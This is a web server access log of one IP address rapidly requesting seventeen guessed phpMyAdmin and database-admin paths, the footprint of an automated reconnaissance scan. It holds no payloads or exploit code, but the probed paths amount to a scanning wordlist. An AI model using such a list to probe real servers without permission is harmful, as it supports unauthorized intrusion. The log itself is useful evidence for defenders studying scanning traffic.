217.217.8.209 - - [13/Jan/2023:17:30:31 -0600] "GET /db/db-admin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:31 -0600] "GET /phpmyadmin1/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:31 -0600] "GET /phpMyAdmin-4.9.7/index.php?lang=en HTTP/1.1" 301 266 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:32 -0600] "GET /administrator/phpmyadmin/index.php?lang=en HTTP/1.1" 301 274 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:32 -0600] "GET /db/dbadmin/index.php?lang=en HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:33 -0600] "GET /mysqladmin/index.php?lang=en HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:33 -0600] "GET /phpMyAdmin-5/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:33 -0600] "GET /sql/phpmyadmin3/index.php?lang=en HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:34 -0600] "GET /php-my-admin/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:34 -0600] "GET /sql/phpmyadmin5/index.php?lang=en HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:34 -0600] "GET /sql/webadmin/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:35 -0600] "GET /phpMyAdmin-5.3.0-all-languages/index.php?lang=en HTTP/1.1" 301 280 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:35 -0600] "GET /sql/webdb/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:36 -0600] "GET /db/myadmin/index.php?lang=en HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:36 -0600] "GET /mysql/web/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:36 -0600] "GET /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php?lang=en HTTP/1.1" 301 299 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:37 -0600] "GET /admin/phpmyadmin/index.php?lang=en HTTP/1.1" 301 266 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
